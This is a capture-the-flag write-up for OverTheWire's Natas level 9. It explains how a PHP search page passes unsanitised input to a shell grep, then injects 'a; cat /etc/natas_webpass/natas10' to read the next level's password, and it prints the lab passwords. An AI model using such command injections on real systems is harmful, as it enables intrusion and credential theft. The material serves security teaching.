# Natas Level 9

```bash
Username: natas9
Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
URL:      http://natas9.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas9.png" />
    <div align="center">Natas 9</div>
</figure>

Clicking on the "View sourcecode" link:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas9-view-sourcecode.png" />
    <div align="center">Natas 9 - View sourcecode</div>
</figure>

Lets investigate the script.
```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```
If the value sent isn't empty (the name of the input box is "needle"), it's using [passthru](http://php.net/manual/en/function.passthru.php) to find this value in the dictionary file, and sending back the results.

For [example](http://natas9.natas.labs.overthewire.org/?needle=a&amp;submit=Search) (if we send the value "a"):
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas9-example.png" />
    <div align="center">Natas 9 - Example</div>
</figure>

We can inject some code, for example: "a; cat /etc/natas_webpass/natas10".

This will result in the following [command](http://natas9.natas.labs.overthewire.org/?needle=a%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10&amp;submit=Search):
```bash
grep -i a; cat /etc/natas_webpass/natas10 dictionary.txt
```

This will print the password (from /etc/natas_webpass/natas10) and the entire dictionary file:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas9-code-injection.png" />
    <div align="center">Natas 9 - Code injection</div>
</figure>

We got the password for the next level: **nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu**